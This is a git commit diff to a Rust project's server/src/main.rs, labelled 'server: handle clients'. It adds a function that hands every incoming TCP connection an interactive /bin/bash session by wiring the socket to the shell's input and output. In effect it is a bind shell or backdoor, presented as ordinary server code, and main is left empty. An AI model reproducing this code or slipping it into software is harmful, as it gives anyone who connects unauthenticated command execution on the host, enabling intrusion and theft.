d6aaa7a4c8801aa5d4e1904ef1f9a8285e0807fc
Krisna Pranav <krisna.pranav@gmail.com>
2022-03-11 18:52:49 +0530

    server: handle clients

--- server/src/main.rs
+++ server/src/main.rs
@@ -1,3 +1,26 @@
+use std::net::{TcpStream, TcpListener};
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+use std::thread;
+
+/**
+ * server code
+ */
+fn handle_client(stream: TcpStream) {
+    let fd = stream.as_raw_fd(); 
+
+    Command::new("/bin/bash")
+        .arg("-i")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()
+        .unwrap()
+        .wait() 
+        .unwrap();
+    
+}
+
 fn main() {
-    println!("Hello, world!");
+
 }
